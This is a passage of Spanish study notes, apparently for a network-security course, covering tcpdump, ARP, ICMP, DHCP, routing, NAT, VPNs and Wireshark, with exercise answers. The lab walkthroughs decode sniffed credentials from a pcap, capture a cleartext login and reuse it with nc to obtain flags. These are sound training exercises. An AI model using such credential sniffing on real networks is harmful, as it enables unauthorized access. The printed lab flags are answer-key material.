tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

De manera predeterminada, *tcpdump* capturará el tráfico en vivo que pasa a través de la red cuando se ejecuta sin modificadores. Al igual que Wireshark, también puede leer y analizar archivos de captura existentes. Para cargar un archivo de captura con tcpdump, use el interruptor -r y especifique la ruta al archivo que desea abrir en su máquina local.

Tcpdump nos permite filtrar datos de la misma manera que Wireshark. Por ejemplo, podemos usar los filtros de host de origen (src host) o de destino (dst host) para generar solo tráfico de origen o de destino, respectivamente.

Tenga en cuenta que el source se refiere al origen de un paquete y el destino indica a dónde fue.

También podemos filtrar por número de puerto (puerto XYZ) para mostrar el tráfico contra un puerto determinado, o por nombre de protocolo como FTP o HTTP. También es posible negar un filtro específico usando la palabra clave _not_ . El uso de la palabra clave _not_ nos permite decirle a tcpdump que intercepte todos los datos que no están restringidos por nuestra definición.

Una de las razones más convincentes para usar una herramienta de línea de comandos como tcpdump sobre una interfaz gráfica como Wireshark es que la línea de comandos puede ofrecer una flexibilidad casi ilimitada.

Al ejecutar tcpdump, también debemos guardar los paquetes que estamos grabando. Para hacer eso, necesitamos usar el modificador -w . Esto nos permitirá analizar los paquetes ya sea con tcpdump o Wireshark. Una vez que tenemos la grabación del archivo, debemos presionar Ctrl + C .

Dado que la entrada y salida de tcpdump es solo texto, podemos canalizarlo hacia o desde otros comandos. Esto puede ser extremadamente poderoso. Por ejemplo, podemos canalizar tcpdump en el comando wc -l para contar fácilmente el número de líneas de salida de una captura. Alternativamente, podemos canalizar tcpdump en el comando cat -n para mostrar los números de línea.

<br />

**Exercises**

**1. ¿Qué bandera puede permitirnos especificar una interfaz para que tcpdump escuche?**

'-i'

<br />

**2. ¿Cuántos paquetes en total se guardan dentro de la captura?**

```bash
tcpdump -r <filename> | wc -l
```

<br />

**3. ¿Cuántos paquetes en la captura son tráfico ARP?**

```bash
tcpdump -r <filename> | grep ARP | wc -l
```

<br />

**4.  ¿Cuántos paquetes en la captura _no_ son tráfico ICMP?**

```bash
tcpdump -r <filename> | grep -v ICMP | wc -l 
```

#### 6.4. TCP/IP Helper Protocol (ARP).

En esta unidad de aprendizaje, cubriremos los protocolos que no son necesariamente los principales actores del modelo TCP/IP, pero que desempeñan funciones de soporte clave que permiten que todo el conjunto funcione bien en conjunto. Distinguimos entre: ARP, ICMP y DHCP.

<br />

##### 4.0.3.4.1. Address Resolution Protocol.

El _Protocolo de resolución de direcciones_ (ARP) es un protocolo de la capa de enlace que está diseñado para asociar direcciones de la capa de red (Direcciones IP) a direcciones de capa de enlace (Direcciones MAC). Esto permite que los switchers transmitan Ethernet's frames (Recordamos que 'frame' es el término que hace referencia a la unidad de información asociada a la capa de enlace) a sus dispositivos de destino previstos en una _red de área local_ (LAN).

Podemos recordar que las máquinas no conocen inherentemente las direcciones MAC de las demás. ARP les permite comunicarse especificando reglas que pueden seguir para saber qué dirección MAC pertenece cada IP.

La máquina A comienza el protocolo *transmitiendo* un frame que contiene tres datos:

1.  La fuente, que es la propia dirección MAC de la máquina.

2.  El destino, ff:ff:ff:ff:ff:ff como destino. Esta es una dirección especial que significa _difusión_ y permite que todas las máquinas de la red reciban el frame.

3.  Un string: "¿Quién tiene la dirección IP que pertenece a la Máquina B? Informe a la Máquina A" se envía.

La máquina A envía este marco y luego la máquina B la recibe. Debido a la información incluida en el marco transmitido, la Máquina B ahora conoce la dirección MAC de la Máquina A. La Máquina B luego responde con su marco, que también contiene tres datos:

1. Su dirección MAC como 'source'.

2. La dirección MAC de la máquina A como 'destination'.

3. Una cadena, que de nuevo se traduce aproximadamente al inglés, dice: "Mi dirección IP está en _esta_ dirección MAC".

La máquina A ahora conoce las direcciones IP y MAC de la máquina B y almacena esa información en su *ARP caché*. Cuando quiera enviar marcos posteriores, ahora puede buscar la información correcta dentro del caché. La Máquina B puede entonces iniciar el mismo procedimiento para aprender y almacenar las direcciones de la Máquina A.

ARP tiene su propio comando, *arp* , que le permite mostrar o manipular el caché de la red. Examinemos cuál es la tabla ARP predeterminada para nuestra máquina virtual Kali.

<br />

##### 4.0.3.4.2. Internet Control Messaging Protocol (ICMP).

El _Protocolo de mensajería de control de Internet_ (ICMP) es un protocolo de la capa de transporte de TCP/IP dado que la información se encapusla después de la IP, sin embargo es mayormente considerado un protocolo de la capa de internet (capa 3) debido a su función de mantenimiento de la infraestructura de la red. 

Concretamente, desempeña una función de soporte crucial: cuando hay un problema con la recepción de datos, alerta al remitente con varios tipos de mensajes de error. Por lo general, no transmite datos en sí mismo, aparte de estos códigos de error.

ICMP normalmente funciona en el fondo de las actividades de red y no suele ser invocado directamente por un usuario final. Una excepción importante a esto es el acto de hacer *ping* a una máquina. Ping es una herramienta bastante omnipresente que envía repetidamente mensajes ICMP a un objetivo. Esto puede permitirnos probar la conectividad de la red al informarnos si podemos llegar al destino. También prueba la *latencia* de conectividad entre las dos máquinas. Mide tanto el tiempo que tarda el paquete ICMP en llegar a su destino como el tiempo que tarda en recibir una confirmación. Estos valores se suman y se devuelven al remitente, generalmente en milisegundos.

<br />

**Exercises**

**1. ¿Qué tamaño en bytes suele enviar un paquete ICMP mediante ping, incluido el encabezado ICMP?**

64

<br />

**2. Abra el archivo _arp_and_icmp.pcap_ en Wireshark. ¿Cuántos paquetes ICMP recibió la máquina en 192.168.49.144?**

```bash
tcpdump -r 13d19bd93a49b9413077ada36228d940-arp_and_icmp.pcap | grep ICMP | grep '> 192.168.49.144' | wc -l
```

<br />

**3. ¿Con qué dirección IP pudo comunicarse más rápido la máquina en 192.168.49.134 a través de ICMP?**

Por un lado, en el output el tiempo de transmisión puede verse separado por un punto después de la hora de envío del paquete, así, cogemos todas estas cantidades y las ordenamos de menor a mayor con el siguiente comando:

```bash
tcpdump -r 13d19bd93a49b9413077ada36228d940-arp_and_icmp.pcap | grep ICMP | grep '192.168.49.134 >' | cut -d " " -f1 | cut -d '.' -f2 | sort -n | head -n 1

reading from file 13d19bd93a49b9413077ada36228d940-arp_and_icmp.pcap, link-type EN10MB (Ethernet), snapshot length 262144
034464

```

Este comando, coge todos los paquetes ICMP enviados por 192.168.49.134, selecciona el tiempo de envío, los ordena de menor a mayor y coge la primera cantidad. Seguidamente utilizamos el siguiente comando para obtener la IP asociada a esta velocidad:

```bash
 tcpdump -r 13d19bd93a49b9413077ada36228d940-arp_and_icmp.pcap | grep ICMP | grep '192.168.49.134 >' | grep 034464 | cut -d '>' -f2 | cut -d ':' -f1        

reading from file 13d19bd93a49b9413077ada36228d940-arp_and_icmp.pcap, link-type EN10MB (Ethernet), snapshot length 262144
10.10.10.24
```

<br />



##### 4.0.3.4.3. Dynamic Host Configuration Protocol (DHCP)

El *Protocolo de configuración dinámica de host* (DHCP) ayuda a garantizar que cualquier máquina nueva que se una a una red pueda interactuar con las máquinas existentes para recibir una dirección IP única y correctamente configurada. En contraste con ICMP, DHCP asume un papel activo en la prevención de problemas en lugar de simplemente informar sobre ellos.

DHCP logra su objetivo a través de la centralización. Se utiliza un servidor DHCP para asignar una dirección IP a cada host que se une a su red. Podemos pensar en el servidor DHCP como si entregara una especie de ticket a cada máquina. Cada boleto contiene un número único y solo es válido durante un período de tiempo predeterminado.

DHCP se comporta de manera similar. Cada máquina que se une a la red recibe una dirección IP única y solo se le permite conservarla o *arrendarla* durante un tiempo definido antes de que deba registrarse con el servidor DHCP para revalidarla.

El proceso comienza cuando una computadora se conecta a la red y pregunta: "¿Algún servidor DHCP aquí?". Esto se llama DHCP Discover.

El servidor DHCP responde con una oferta de DHCP. Esencialmente, "Estoy aquí y puedo darle la dirección IP 192.168.1.11" (O cualquier dirección IP que esté disponible).

La computadora responde con una solicitud de DHCP, "Claro, gracias".

Finalmente, el servidor DHCP responde con un DHCP ACK. Esto asigna la dirección IP y le dice a la computadora la máscara de subred de la red, su dirección de puerta de enlace predeterminada y su(s) dirección(es) del servidor de nombres de dominio (DNS). También le dice a la computadora cuánto tiempo tiene la dirección IP antes de necesitar revalidarla.

<br />

**Exercises**

**1. ¿Qué protocolo de capa de transporte utiliza DHCP?**

UDP

**2. El período de tiempo durante el cual una máquina puede mantener su dirección IP asignada por DHCP se denomina: _____**

Lease

**3.  Abra el archivo _dhcp_capture.pcap_ en Wireshark. ¿Cuál es la dirección IP del servidor DHCP?**

Observamos la captura de Wireshark de cerca:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221228180726.png' | relative_url }}" text-align="center"/>
</div>

Observamos que en primer lugar se envía un mensaje de difusión con una request DHCP y seguidamente el servidor DHCP responde devolviendo el DHCP ACK.

**4.  ¿Qué dirección IP ofrece el servidor DHCP al cliente DHCP?**

Siguiendo con la captura anterior podemos observar que la última dirección a la que se dirigen los paquetes envíados por el servidor DHCP es el 172.16.92.135

**5.  En la captura de paquetes, ¿qué paquetes tienen una longitud más corta, la "Request" o el "ACK" de DHCP?**

Reques

**6.  ¿Por cuánto tiempo en minutos se asignan las direcciones IP?**

Según la teoría esta información viene dada por el paquete que contiene la 'DHCP Offer'. De esta forma examinamos el contenido de dicho paquete y encontramos una cabecera que contiene Time Least:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221228182729.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 6.5. Useful Network Technologies.

Esta unidad de aprendizaje cubre varias tecnologías de red importantes, incluidas Routing Tables (las tablas de enrutamiento), Firewalls (los cortafuegos), Network Address Translation (NAT) and Port Address Translation (PAT) and Virtual Private Networks (VPN).

<br />

##### 6.5.1. Routing Tables.

Cuando un host envía datos a otro que se encuentra en una red distinta, esto es que la máquina de destino no está en contacto directo con el router del host fuente, se necesita comunicar al router (enrutador) a dónde enviar los paquetes. Para ello, el enrutador utilizará algo llamado *Routing Table* (Tablas de enrutamiento).

Las tablas de enrutamiento ayudan a las máquinas a determinar cómo pueden enviar información a otros hosts con los que es posible que no tengan una conexión directa. Una tabla de enrutamiento es simplemente una tabla de filas y columnas que contienen información importante sobre los próximos saltos (hops) en la red (cada salto es un router por el que pasan los paquetes hasta llegar a su destino). Una tabla de enrutamiento esencialmente describe un gráfico de cómo su enrutador (o host de red) puede llegar a una variedad de destinos potenciales de la manera más eficiente, utilizando la menor cantidad de saltos posible.

Las tablas de enrutamiento se pueden utilizar para dirigir el tráfico dentro de una red o a través de varias redes. Para este último, las tablas de enrutamiento pueden incluir datos tanto estáticos como dinámicos. Las rutas estáticas son simplemente direcciones codificadas, mientras que las rutas dinámicas las aprende una máquina o un enrutador a través de algún protocolo de red (por ejemplo, DHCP).

Podemos ver las tablas de enrutamiento de las máquinas basadas en Windows y Linux a través del comando: route

```bash
route

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         192.168.52.254  0.0.0.0         UG    100    0        0 eth0
192.168.52.0    0.0.0.0         255.255.255.0   U     100    0        0 eth0
```

<br />

La primera línea de salida indica que cualquier tráfico recibido por la máquina que no esté en el rango 192.168.52.0/24 se reenvía a la puerta de enlace (Gateway; ) predeterminada, 192.168.52.254. (Sabemos que es /24 porque antes aprendimos que el CIDR de 255.255.255.0 es /24). Esa puerta de enlace luego se encarga de reenviar los paquetes más lejos. Cualquier tráfico destinado a 192.168.52.0/24 se _reenvía_ a 0.0.0.0, lo que significa que el tráfico no viaja más. 0.0.0.0 es una dirección IP especial que generalmente designa un destino desconocido o no enrutable. Sin embargo, su uso en las tablas de enrutamiento indica la ruta predeterminada que debe tomar el tráfico, a menos que se especifique en otra entrada de la tabla.

En otras palabras, nuestra VM puede llegar a cualquier máquina en la subred 192.168.52.0/24. Cualquier máquina en esa subred también puede acceder a ella, todo sin la ayuda de un enrutador, porque pertenecen a la misma clase de red.

Además, no podemos llegar a ninguna otra subred o red directamente. Todo el tráfico generado en la máquina virtual que no coincide específicamente con la segunda línea sale a la puerta de enlace predeterminada. La puerta de enlace predeterminada (un enrutador simple o un firewall) decidirá qué paquetes reenviar y hacia dónde. Discutiremos los cortafuegos en breve.

<br />

**3. Now, connect to the VPN using your own Kali VM, and execute the _route_ command. How many entries are added to the routing table by connecting to the VPN? (provide the number only).**

Podemos ver que al conectarnos a nuestra máquina virtual y observar la Route Table con 'route':

```bash
route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   
0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0     
192.168.1.0     0.0.0.0         255.255.255.0   U     100    0     
192.168.49.0    0.0.0.0         255.255.255.0   U     0      0     
192.168.151.0   192.168.49.1    255.255.255.0   UG    0      0     
```

Podemos observar que se han añadido dos rutas correspondientes a dos direcciones distintas, por un lado la ruta a nuestra IP dentro de la VPN y la Gateway demostrando así que ambas direcciones no están en la misma red pues para que el paquete medie entre ambos dispositivos salta a lo largo de varios routers, el nuestro y de ahí al de la VPN.

<br />

##### 6.5.2. Firewalls.

Los Firewalls regulan la entranda o salida de tráfico en un nexo entre redes o dentro de una red, esto es; reciben y luego eliminan o permiten que el tráfico entrante y saliente pase a través de una red según una serie de reglas (rules) que definen los administradores del firewall.

El tipo más común de cortafuegos es el *packet filter*, que básicamente toma cada paquete que recibe y decide si el paquete debe continuar su viaje (o no). Las reglas que utiliza para determinar el destino de cada paquete se capturan en una *Lista de control de acceso* (Access Control List).

Las ACL tienen varias aplicaciones para la seguridad. Por ejemplo, a menudo se utilizan para determinar los permisos en un sistema de archivos o para determinar los niveles de acceso en un dominio de Active Directory. En el contexto de los firewalls, las ACL son simplemente listas de reglas que expresan si un paquete que se origina en alguna fuente y/o se dirige a algún destino debe pasar o no. Hay conjuntos de reglas un poco más complejos disponibles (dependiendo de la implementación) en lugar de simplemente *drop* o *accept*. Por ejemplo, la ACL de un firewalls puede especificar una regla de _rechazo_ , que elimina un paquete dado pero también envía un mensaje al originador para informarle que su paquete fue rechazado.

Los cortafuegos se pueden usar para controlar el tráfico en una máquina en particular o para controlar el tráfico a través de una red. Por ejemplo, el programa *iptables* incluido en Kali y otras distribuciones de Linux es un firewall basado en host que permite al usuario administrar varias reglas que dictan cómo la máquina maneja el tráfico. Veremos cómo usar iptables en un tema posterior.

Los cortafuegos basados ​​en red, por otro lado, también se pueden implementar como software que se ejecuta en un host dedicado, pero también se pueden implementar como dispositivos de hardware independientes especiales.

<br />

##### 6.5.3. Network Address Translation (NAT) and Port Address Translation (PAT).

Anteriormente, mencionamos que las máscaras de subred ayudan a IPv4 a resolver el problema de tener muy pocas direcciones para satisfacer la demanda de Internet. La traducción de direcciones de red (NAT) es otra herramienta utilizada por IPv4 para aumentar la cantidad de direcciones IP posibles.

*NAT funciona mediante la creación de un mapa de uno a muchos entre direcciones IP privadas y direcciones IP públicas en combinación con las máscaras de subred. Primero, analicemos esta noción de direcciones IP privadas. Ciertos rangos del espacio de direcciones IPv4 están reservados para uso privado. Esencialmente, esto significa que cualquier persona puede crear redes privadas usando estas direcciones, porque en sí mismas no se conectan a Internet. Estos rangos son*:

-   10.0.0.0/8

-   172.16.0.0/12

-   192.168.0.0/16

Esta es la razón por la cual las máquinas a las que se conecta a través de Offsec Labs están en el espacio de direcciones 192.168.0.0/16.

Digamos que creamos una red de tres máquinas en la subred 192.168.10.0:

-   M1: 192.168.10.1
   
-   M2: 192.168.10.2

-   M3: 192.168.10.3

Usemos la dirección IP de 192.124.249.5.

Estas máquinas están ubicadas en nuestra red privada, detrás de NAT. Cuando cualquiera de estas máquinas intente conectarse a una dirección IP pública (suponiendo que las reglas de enrutamiento y firewall permitan dicho tráfico), sucederán algunas cosas.

Primero, la máquina (digamos M1) enviará un paquete a su destino previsto, 192.124.249.5. El encabezado del paquete contendrá la propia dirección IP de M1 como origen, así como la dirección IP 192.124.249.5 como destino.

En segundo lugar, la puerta de enlace predeterminada de la red recibirá el paquete. Sobrescribirá la dirección _IP_ de origen con la dirección IP *pública* de la puerta de enlace.

En tercer lugar, la puerta de enlace enviará el paquete modificado a 192.124.249.5. La puerta de enlace también recordará la IP de origen original del paquete, de modo que cuando se reciba cualquier tráfico de retorno, pueda redirigir el tráfico de manera adecuada sobrescribiendo la IP de _destino ._

NAT aumenta considerablemente la cantidad de direcciones que pueden comunicarse en Internet, pero también tiene algunas implicaciones importantes para la seguridad. Dado que la puerta de enlace predeterminada sobrescribirá todas las direcciones IP de origen por su dirección pública, cualquier tráfico que pase a través de la puerta de enlace parece que proviene de la misma puerta de enlace. Esto ayuda a proteger las direcciones IP internas, ya que es difícil para un destino determinado saber cuál es la dirección IP de origen "real". Por otro lado, NAT puede dificultar la atribución del tráfico a los administradores de redes y sistemas _fuera_ de una red privada.

*Port Address Translation (PAT) es una extensión de NAT, donde a cada sistema dentro de una red privada se le asigna un número de puerto específico entre 0 y 65535. Cuando la puerta de enlace de la red recibe un paquete de M1 , sobrescribirá la dirección IP de origen con su propio, tal como lo haría con NAT estándar. Además, también sobrescribirá el puerto de origen con el número de puerto dedicado de M1. De esta manera, el receptor puede diferenciar entre un paquete proveniente de M1 y un paquete proveniente de otra máquina (M3 , por ejemplo), porque sus puertos de origen serán únicos aunque tengan la misma IP.*

<br />

##### 6.5.4. Redes Privadas Virtuales (VPN).

Una _red privada virtual_ (VPN) esencialmente permite la creación de una red privada que actúa como un túnel dedicado dentro de otra red pública (es decir, Internet). Esto puede permitir que los administradores de red alojen, proporcionen y accedan a recursos que no están abiertos a la red pública, al mismo tiempo que mantienen la conectividad de la red pública.

Se puede acceder a una VPN de forma remota a través de varios protocolos de autenticación. Por ejemplo, la VPN utilizada para acceder a los laboratorios emplea autenticación basada en certificados. Aprenderemos más sobre la autenticación basada en certificados en el tema posterior. Las VPN también se pueden configurar para permitir la autenticación tradicional basada en credenciales, así como una combinación de ambas.

Cuando un usuario se autentica en una VPN, su host recibe una nueva interfaz de red virtual. Esa interfaz, normalmente llamada _tun0_ o _tap0_ , se proporciona con una o más rutas a la red privada. El host ahora puede comunicarse con las máquinas que residen en esa red, pendiente de las reglas controladas por el firewall de la VPN.

En Kali, podemos conectarnos a una VPN usando un paquete VPN o un archivo .ovpn . Este archivo contiene varios datos sobre la red, así como los certificados o claves necesarios para conectarse.

Echemos un vistazo a un archivo .ovpn utilizado para conectarse a los laboratorios.

```bash
kali@kali:~$ cat vpn_config.ovpn  -n
     1  persist-tun
     2  persist-key
     3  tls-client
     4  clien
     5  resolv-retry 5
     6  connect-retry-max 1
     7  explicit-exit-notify 1
     8  remote-cert-tls server
     9  nobind
    10  remote-random
    11  dev tun
    12  cipher AES-128-CBC
    13  ncp-ciphers AES-128-GCM
    14  auth SHA1
    15  remote pg-pool1.offseclabs.com 1194 udp
    16  remote pg-pool2.offseclabs.com 1194 udp
    17  verify-x509-name "offensive-security.com" name
    18  <ca>
...
```

Incluso si no sabemos lo que significa cada una de estas líneas, podemos extraer algunas cositas que se destacan. Por ejemplo, podemos saber en la línea 14 qué algoritmo de autenticación está utilizando la VPN, y las líneas 15 y 16 nos dicen a qué nombre de dominio y puerto conectarse.

Podemos conectarnos a la VPN proporcionando al cliente openvpn el nombre del paquete VPN.

```bash
kali@kali:~$ sudo openvpn vpn_config.ovpn
2021-04-27 16:44:27 Note: Treating option '--ncp-ciphers' as  '--data-ciphers' (renamed in OpenVPN 2.5).
2021-04-27 16:44:27 DEPRECATED OPTION: --cipher set to 'AES-128-CBC' but missing in --data-ciphers (AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-128-CBC' to --data-ciphers or change --cipher 'AES-128-CBC' to --data-ciphers-fallback 'AES-128-CBC' to silence this warning.
2021-04-27 16:44:27 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Feb 24 2021
2021-04-27 16:44:27 library versions: OpenSSL 1.1.1j  16 Feb 2021, LZO 2.10
2021-04-27 16:44:27 TCP/UDP: Preserving recently used remote address: [AF_INET]142.44.204.172:1194
2021-04-27 16:44:27 UDP link local: (not bound)
2021-04-27 16:44:27 UDP link remote: [AF_INET]142.44.204.172:1194
2021-04-27 16:44:27 [offensive-security.com] Peer Connection Initiated with [AF_INET]142.44.204.172:1194
2021-04-27 16:44:28 TUN/TAP device tun0 opened
2021-04-27 16:44:28 net_iface_mtu_set: mtu 1500 for tun0
2021-04-27 16:44:28 net_iface_up: set tun0 up
2021-04-27 16:44:28 net_addr_v4_add: 192.168.49.130/24 dev tun0
2021-04-27 16:44:28 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
2021-04-27 16:44:28 Initialization Sequence Completed
```

Nota: necesitamos invocar sudo porque la interfaz de red tun0 debe crearse con permisos elevados. Este es el error que recibimos cuando intentamos conectarnos como usuario de kali.

```bash
kali@kali:~$ openvpn vpn_config.ovpn
2021-04-27 18:12:43 Note: Treating option '--ncp-ciphers' as  '--data-ciphers' (renamed in OpenVPN 2.5).
2021-04-27 18:12:43 DEPRECATED OPTION: --cipher set to 'AES-128-CBC' but missing in --data-ciphers (AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-128-CBC' to --data-ciphers or change --cipher 'AES-128-CBC' to --data-ciphers-fallback 'AES-128-CBC' to silence this warning.
2021-04-27 18:12:43 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Feb 24 2021
2021-04-27 18:12:43 library versions: OpenSSL 1.1.1j  16 Feb 2021, LZO 2.10
2021-04-27 18:12:43 TCP/UDP: Preserving recently used remote address: [AF_INET]51.222.130.179:1194
2021-04-27 18:12:43 UDP link local: (not bound)
2021-04-27 18:12:43 UDP link remote: [AF_INET]51.222.130.179:1194
2021-04-27 18:12:43 [offensive-security.com] Peer Connection Initiated with [AF_INET]51.222.130.179:1194
2021-04-27 18:12:44 ERROR: Cannot ioctl TUNSETIFF tun: Operation not permitted (errno=1)
2021-04-27 18:12:44 Exiting due to fatal error
```

Sugerencia para la solución de problemas: el cliente OpenVPN no le impedirá conectarse a la misma VPN varias veces. La única indicación que recibirá es que se creará una interfaz de red _tun1_ en lugar de tun0. Esto se puede observar en la salida de openvpn, así como al ejecutar el comando ip .

Las VPN de Offsec no permiten que se produzcan múltiples conexiones del mismo usuario al mismo tiempo. Sin embargo, dado que el _cliente_ puede conectarse a la VPN en momentos arbitrarios, el resultado final es que se puede perder el tráfico y las conexiones pueden ser lentas. Si nota que su conectividad a la VPN responde menos de lo habitual, verifique que no se haya conectado a la VPN a través de varias instancias.

**1.  ¿A qué puerto se conecta la VPN de laboratorios?**

1194

**2.  ¿Cuál es la Unidad de transmisión máxima predeterminada configurada por la VPN de laboratorios?**

1500

**3.  ¿La VPN se conecta por defecto en TCP o UDP?**

UDP porque usualmente es más rápida.

<br />

### 7. WireShark.
#### 7.1. Wireshark Basics.

Como ya sabemos de las secciones anteriores WireShark es una herramientas de análisis de tráfico de red con GUI, un snifador de paquetes de red. 

Wireshark usa las bibliotecas *Libpcap* (en Linux) o *Winpcap* (en Windows) para capturar paquetes de la red.

Al analizar el tráfico de red con un sniffer, es fácil sentirse abrumado por la cantidad de ruido o basura en los datos recopilados. Para facilitar el análisis, podemos aplicar los conocidos *capture filters* y *display filters* dentro de Wireshark. Si aplicamos *filtros de captura* durante una sesión de Wireshark, cualquier paquete que no coincida con los criterios de filtrado se eliminará y los datos restantes se pasarán al _motor de captura_ . Luego, el motor de captura disecciona los paquetes entrantes, los analiza y finalmente aplica cualquier _filtro de visualización_ adicional antes de mostrar la salida.

Este proceso se puede visualizar con la siguiente figura:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221229154724.png' | relative_url }}" text-align="center"/>
</div>

El secreto para usar cualquier sniffer de red, incluido Wireshark, es aprender a usar filtros de captura y visualización para eliminar datos superfluos. 

Podemos lanzar Wireshark como sudo:

```bash
sudo wireshark
```

Esto se hace para garantizar el correcto funcionamiento de este en todas las interfaces de red.

Una vez lo hemos abierto, un uso amateur de Wireshark consiste en controlar los Filtros de Captura (Capture Filters) y los Filtro de Visualización (Display Filters) a conveniencia para visualizar sólo la información que nos interesa. Por ejemplo, para ver sólo aquellos paquetes que van hacia la red 10.11.1.0/24

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221229170849.png' | relative_url }}" text-align="center"/>
</div>

Por otra parte, los display filters son mucho más flexibles que los filtros de captura y tienen una sintaxis ligeramente diferente. Los filtros de visualización, como sugiere el nombre, solo filtrarán los paquetes que se muestran mientras Wireshark continúa capturando todo el tráfico de red para el rango de direcciones 10.11.1.0/24 en segundo plano. Debido a esto, es posible borrar el filtro sin tener que reiniciar nuestra captura haciendo clic en el ícono 'x' a la derecha del filtro de visualización:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221229174227.png' | relative_url }}" text-align="center"/>
</div>

Es decir, los filtros de captura se establecen antes de comenzar a capturar para desechar paquetes que no nos interesan mientras que los paquetes de visualización se establecen en medio del proceso de 'sniffing'.

Además si encontramos un paquete cuya información nos interesa, generalmente este paquete forma parte de lo que llamamos una 'conversación', un intercambio de una serie de paquetes. Para ver la información de todos los paquetes que forman parte de dicha conversación le damos a Follow Stream.

Esto es, botón derecho sobre el paquete, Follow > TCP/HTTP/... Stream:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221229180711.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221229180722.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Exercises**

**6.Para resolver este desafío, en la VM n.º 1 debe determinar la contraseña que se utilizó para ingresar al servidor remoto. Para hacer esto, descargue _password_cracking.pcap_ del servidor web VM #1. Esta tarea se centra principalmente en leer capturas de paquetes, pero también utiliza algunas habilidades que no se enseñan directamente en este módulo, como decodificar cadenas codificadas o identificar autenticación, que son muy útiles para problemas futuros.**

En primer lugar hacemos un scanning sobre la máquina que acabamos de activar y observamos que tiene una web server abierta:

```bash
──(root㉿kali)-[~]
└─# pscan 192.168.143.52
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 13:27 EST
Nmap scan report for 192.168.143.52
Host is up (0.097s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 672fbffea6614d136862e4abd3c98e50 (RSA)
|   256 7c3c8eea64482a755b86c85dd069b1fc (ECDSA)
|_  256 744813a7a297bf93cc21e48e9eef20ce (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Unix))
|_http-server-header: Apache/2.4.52 (Unix)
|_http-title: Index of /
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.40 seconds
```

Acudimos a la web y observamos que podemos descargar un archivo .pcap. Lo abrimos con Wireshark y encontramos una gran cantidad de paquetes.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221229192934.png' | relative_url }}" text-align="center"/>
</div>

Al examinarlos con Follow > TCP Stream nos encontramos ante una multitud de conversaciones que son esencialmente intentos de logeos:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221229193000.png' | relative_url }}" text-align="center"/>
</div>

Sin embargo a juzgar por la respuesta del servidor, la mayoría de estas credenciales son falsas. Continuamos investigando hasta que observamos que el stream 51 tiene unas credenciales acertadas:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221229193201.png' | relative_url }}" text-align="center"/>
</div>

El hecho de que sólo tenga caracteres imprimibles y varios iguales al final de la cadena sugiere que está codificada en Base64:

```bash
base64 -d <<< T1N7NWNjYjA0NTYzZTU5M2M0NWM0OTU0NjExMTdlN2ZhMjR9    
OS{5ccb04563e593c45c495461117e7fa24} 
```

<br />

**7. Sigamos probando esas habilidades de análisis de red; sin embargo, esta vez será usted quien capture el tráfico. Descargue el archivo ejecutable de captura de tráfico de Practical Tools - Wireshark - servidor web VM en el puerto 80 y conéctelo a Practical Tools Wireshark VM. Este programa se conectará e iniciará sesión en un servidor remoto. Observe el tráfico, determine la información requerida (servidor, puerto y credenciales) y luego inicie sesión en este servidor remoto para obtener el indicador.**

En primer lugar acudimos a la web de la máquina y descargamos el archivo ejecutable. Seguidamente utilizamos Wireshark para filtrar la interfaz tun0 y ejecutamos el binario:

```bash
./traffic-capture 192.168.143.52
```

Interceptamos el intercambio de una serie de paquetes y dandole a Follow > UDP Stream obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221229203829.png' | relative_url }}" text-align="center"/>
</div>

Así, las credenciales son offsec:qwerty. Por otra parte, examinando el resto de capas de los paquetes, encontramos que en la capa TCP:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221229204012.png' | relative_url }}" text-align="center"/>
</div>

Así, el puerto de destino es el 3084 y la IP de destino es 192.168.143.52.

Así; con netcat ejecutamos el comando:

```bash
nc 192.168.143.52 3084
220 PTAP Fake Transfer Protocol (FTP) Service
USER offsec
331 offsec access allowed, send password.
PASS qwerty
230 offsec user logged in.
HELP
200 Command okay.
205 OPTIONS:
SYST
FLAG
HELP
QUIT
FLAG
200 Command okay.
1337 Great Job. The flag is:
OS{115b6d5531a4a6c5ab452ccb8f388f03}
```

<br />


### 8. TcpDump.

#### 8.1. TcpDump Basics.

